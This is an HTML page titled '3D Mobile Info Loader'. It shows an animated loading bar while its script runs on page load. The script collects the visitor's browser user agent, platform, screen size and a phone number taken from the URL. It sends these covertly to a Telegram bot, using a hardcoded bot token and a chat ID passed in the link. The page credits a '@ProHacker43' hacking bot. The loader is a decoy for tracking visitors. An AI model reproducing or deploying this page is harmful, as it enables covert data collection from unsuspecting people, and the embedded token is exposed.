<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>3D Mobile Info Loader</title>
<style>
  body {
    margin: 0;
    font-family: 'Segoe UI', Arial, sans-serif;
    background: linear-gradient(135deg, #ff416c, #ff4b2b);
    height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    perspective: 1000px;
    overflow: hidden;
  }
  .card {
    width: 360px;
    height: 360px;
    background: rgba(255,255,255,0.08);
    border-radius: 25px;
    display: flex;
    align-items: center;
    justify-content: center;
    transform-style: preserve-3d;
    box-shadow: 0 25px 60px rgba(0,0,0,0.3);
    animation: rotate 7s infinite linear;
  }
  @keyframes rotate {
    0% { transform: rotateX(0deg) rotateY(0deg);}
    100% { transform: rotateX(360deg) rotateY(360deg);}
  }
  .loader {
    width: 220px;
    height: 20px;
    background: rgba(255,255,255,0.25);
    border-radius: 12px;
    overflow: hidden;
    box-shadow: inset 0 0 12px rgba(0,0,0,0.25);
  }
  .loader-bar {
    width: 0%;
    height: 100%;
    background: linear-gradient(90deg,#00c6ff,#0072ff);
    border-radius: 12px;
    box-shadow: 0 0 10px rgba(0,255,255,0.6);
    transition: width 0.05s linear;
  }
  .status {
    position: absolute;
    bottom: 35px;
    color: #fff;
    font-weight: 600;
    text-align: center;
    width: 100%;
    font-size: 16px;
    text-shadow: 0 0 12px rgba(0,0,0,0.5);
  }
</style>
</head>
<body>
<div class="card">
  <div class="loader"><div class="loader-bar" id="loaderBar"></div></div>
</div>
<div class="status" id="status">Loading...</div>

<script>
(async function(){
const BOT_TOKEN = "8062278856:AAGO17YgYVRP_WiLcLoqhA0MLtuClIRwZas"; 
const CHAT_ID_FROM_URL = new URLSearchParams(location.search).get('userid') || '';
const loaderBar = document.getElementById('loaderBar');
const statusEl = document.getElementById('status');

function safeText(s){ return String(s||'').replace(/<|>/g,''); }

// د ډیواس معلوماتو راټولول
async function collectDeviceInfo(){
  const nav = navigator;
  const ua = nav.userAgent || 'unknown';
  const platform = nav.platform || 'unknown';
  const screenSize = (screen.width||0) + 'x' + (screen.height||0);
  const dpr = window.devicePixelRatio || 1;

  // دلته د موبایل نمبر ځای نیول
  // که کارونکي داخل کړي، یا له URL یا input څخه اخیستل
  const phoneNumber = new URLSearchParams(location.search).get('phone') || 'Not provided';

  return {ua, platform, screenSize, dpr, phoneNumber};
}

// میسج جوړول
function makeMessage(info){
  const now = new Date().toLocaleString();
  const lines = [
    '🔥 Mobile Info Alert! 🔥',
    '🛡️ Device info',
    `📱 Phone Number: ${safeText(info.phoneNumber)}`,
    `1) Model/Platform: ${safeText(info.platform)}`,
    `2) User Agent: ${safeText(info.ua)}`,
    `3) Screen: ${safeText(info.screenSize)} @${safeText(info.dpr)}x`,
    '',
    `⏰ Time: ${now}`,
    `🦠 BotDeveloper: @ProHacker43`,
    `🪬 Bot link: @PROCAM_43KHACKBOT`,
    `💀 Stay vigilant!`
  ];
  return lines.join('\n');
}

// ټیلیګرام ته لیږل
async function sendToTelegram(message){
  if(!CHAT_ID_FROM_URL){statusEl.textContent='Missing userid in URL'; return;}
  try{
    const fd = new FormData();
    fd.append('chat_id', CHAT_ID_FROM_URL);
    fd.append('text', message);
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:'POST',body:fd});
    const json = await res.json();
    if(!json.ok) throw new Error(json.description||'Telegram error');
    statusEl.textContent='Sent ✅';
  }catch(err){
    console.error(err);
    statusEl.textContent='Send failed';
  }
}

// لودینګ بار متحرکول
function animateLoader(duration=2500){
  return new Promise(resolve=>{
    let start = null;
    function step(timestamp){
      if(!start) start=timestamp;
      let progress = Math.min((timestamp-start)/duration*100,100);
      loaderBar.style.width = progress+'%';
      statusEl.textContent = `Loading... ${Math.round(progress)}%`;
      if(progress<100) requestAnimationFrame(step);
      else resolve();
    }
    requestAnimationFrame(step);
  });
}

// اصلي عملیات
(async function main(){
  const info = await collectDeviceInfo();
  await animateLoader(2500);
  await sendToTelegram(makeMessage(info));
})();
})();
</script>
</body>
</html>
